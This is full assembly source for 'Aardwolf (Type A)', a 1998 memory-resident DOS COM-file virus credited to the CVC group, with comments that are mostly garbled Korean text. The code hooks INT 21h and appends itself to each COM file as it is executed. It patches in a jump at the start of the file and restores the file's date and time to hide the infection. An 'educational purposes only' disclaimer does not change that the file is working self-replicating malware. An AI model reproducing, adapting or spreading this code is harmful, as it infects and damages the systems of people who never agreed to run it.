;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; Virus Name : Aardwolf (Type A)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/20
; Type       : Memory resident COM
;
;   !************************************************************************!
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; ! Aardwolf (Type A)
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .286
	    .MODEL  TINY
	    .CODE

            org  0h

 PARASIZE   EQU  (End_Memory - Aardwolf + 0Fh) SHR 4 + 10h

 Aardwolf:
	    call  Get_Ip
 Get_Ip:    pop   si
	    sub   si,0003		    ;

            mov   ax,0f1f1h                 ;
	    int   21h
	    cmp   ax,0f2f2h
	    jnz   Resident
                                            ;
            add   si, offset Buffer         ;
	    mov   di, 100h
	    movsw
	    movsw
	    mov   ax,100h
	    push  ax
	    ret

 Resident:
            mov   PSP1[SI], ds              ;
	    mov   PSP2[SI], ds
	    mov   PSP3[SI], ds

            mov   ax, es                    ;
	    add   ax,0010h
	    mov   es,ax
	    push  es
	    mov   ax, offset New_CS
	    push  ax

	    mov   cx, offset End_virus	    ;
	    xor   di, di
	    repz  movsb
	    retf
 New_CS:
            push  cs                        ; CS=SS
	    pop   ss
	    mov   sp, offset End_Memory     ;

            push  cs                        ; Int 21h
	    pop   ds
	    mov   ax, 3521h
	    int   21h

            mov   word ptr OldInt21,BX
            mov   word ptr OldInt21[2],ES

            mov   ax, 2521h                 ; Int 21h
	    push  cs
	    pop   es
	    mov   dx, offset NewInt21Handler
	    int   21h

	    mov   ah, 4ah		    ;
	    mov   bx, PARASIZE
            mov   es, PSP1
            int   21h

            call  Set_env                   ;

            push  cs
            pop   es

            mov   ax, 4b00h                 ;
            mov   bx, offset Env_Block
	    call  Call_Int21

	    push  ds
	    pop   es

            mov   ah, 49h                   ;
	    int   21h

            mov   ah, 31h                   ;
            mov   dx, Parasize              ;
	    int   21h

 Msg	    db	  0dh,0ah
            db    '[Aardwolf] Type.A',0dh,0ah
            db    '(c) Copyleft 1998 by Crom/CVC,Corea$'

;******************************************************************************
;	    Virus Int 21h Handler
;******************************************************************************

 NewInt21Handler:
	    pushf
	    cmp   ax, 0F1F1h		    ;
	    jnz   Check_Execute
	    mov   ax, 0F2F2h
	    popf
	    iret

 Check_Execute:
            pusha                           ;
	    push  ds
	    push  es

	    cmp   ah,4Bh		    ;
	    jz	  SetInt24
            jmp   Pop_

 SetInt24:
            push  ds
            xor   ax,ax
            mov   ds,ax

	    push  DS:[0090h]		    ; Int 24h
	    Push  DS:[0092h]

            mov   DS:[0090h],offset NewInt24; Int 24h
	    mov   DS:[0092h],cs

            pop   ds                        ;
	    mov   ax,4300h		    ; �����苡
	    int   21h

	    push  ds			    ; �a�� ���q
	    push  dx
	    push  cx			    ; ����

	    xor   cx,cx 		    ; ����/�a���� �a��
	    mov   ax,4301h
	    int   21h
	    jnc   Open_File
	    Jmp   Open_Fail		    ; ���A���e �{��

 Open_File:
	    mov   ax,3d02h		    ; �a�� ���e
	    int   21h
	    jnc   GetDT
	    jmp   Open_Fail
 GetDT:
            xchg  ax,bx                     ; �a�� Ѕ�i

            mov   ax,5700h                  ; �q�q�a���� �i�a/���e �苡
	    int   21h
	    push  cx
	    push  dx

            push  cs                        ; cs=ds
	    pop   ds
            Push  cs                        ; cs=es
            Pop   es

	    mov   ah,3Fh		    ; �a�� ����
            mov   dx,offset Buffer
            mov   cx,004h
	    int   21h

            mov   AX, word ptr Buffer       ;
            cmp   ax,'ZM'                   ; EXE �a�� ���a ?
            jz    Set_Date
            cmp   byte ptr Buffer, 0E9h     ; JMP �w�w���a ?
            jnz   Infect_COM
            cmp   byte ptr Buffer+3, 0FFh   ; �q�q �A���a ?
            jz    Set_Date
 Infect_COM:
            mov   ax,4202h                  ; �a�� �{�a�� ����
            xor   cx,cx
            xor   dx,dx
            int   21h

            sub   ax,0003                   ;
            mov   word ptr Jump_Code+1, ax  ;

            mov   ah, 40h                   ; �a����a �a��
            mov   cx, offset End_virus
            xor   dx, dx
            int   21h

            mov   ax, 4200h                 ; COM ��q�a�� ����
            xor   cx, cx
            xor   dx, dx
            int   21h

            mov   ah, 40h                   ; �e�w�E JMP �w�w �a��
            mov   cx, 0004
            mov   dx, offset Jump_Code
            int   21h

 Set_Date:
	    pop   dx			    ; �i�a ����
	    pop   cx
	    mov   ax,5701h		    ; �i�a/���e ���w�a�� ����
	    int   21h
 Close_file:
	    mov   ah,3Eh		    ; �a�� �h��
	    int   21h
 Open_Fail:
	    mov   ax,4301h		    ; ���� ���� �e��
	    pop   cx
	    pop   dx
	    pop   ds
	    int   21h
	    xor   ax,ax 		    ; ���� Int 24h �� �a��
	    mov   ds,ax
	    pop   DS:[0092h]
	    pop   DS:[0090h]
 pop_:
            pop   es
	    pop   ds
	    popa
	    popf

 Jmp_Org_Int21:
            db    0EAh                      ;
 OldInt21   dd	  ?

 NewInt24:
            xor   al,al                     ; Int 24h Ѕ�i��
	    iret

;******************************************************************************
; �ŉw�w�b�A�� ����З�A ϩ�a�e ���� �苡
;******************************************************************************

 Set_Env    proc  near

 Search_RD:                                 ; ����З�i ���e �����i ��� ���a.
	    xor   si,si
	    mov   ax, PSP1
	    mov   ds,ax
	    mov   ds,ds:[002Ch] 	    ; ��З��ǥ �a���� ���q�i �i�a���a.

 Search_RD_LOOP:
	    cmp   word ptr DS:[SI],0000     ; �a�����q��A�e 0000���a.
	    jz	  Get_FileName		    ; PSP:[002Ch] --> �A�a���a
	    inc   si
	    jmp   Search_RD_LOOP

 Get_FileName:
	    add   si,0004
	    mov   dx,si 		    ; �e�� ��З�A�e �a�����q
	    ret
 Set_env    endp

;
; ������a 21h ѡ
;

 Call_Int21 proc  near

	    pushf
	    call  dword ptr cs:OldInt21
	    ret

 Call_Int21 endp

;
; ����З�i ���e �i��
;

 ENV_BLOCK  dw	  ?			    ; ����З�w �i��
	    dw	  80h			    ;
 PSP1	    dw	  ?
	    dw	  5ch			    ;
 PSP2	    dw	  ?
	    dw	  6ch			    ;
 PSP3	    dw	  ?

 Jump_code  db    0E9h, ?, ?, 0FFh          ;
 Buffer     db    0CDh, 20h, 90h, 90h       ; �|����

 End_Virus:

	    db	  100h dup (?)		    ; �aȂ ����
 End_Memory:

	    END   Aardwolf

